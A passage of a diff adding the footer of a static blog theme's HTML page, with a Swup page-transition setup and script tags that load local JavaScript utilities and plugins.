+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
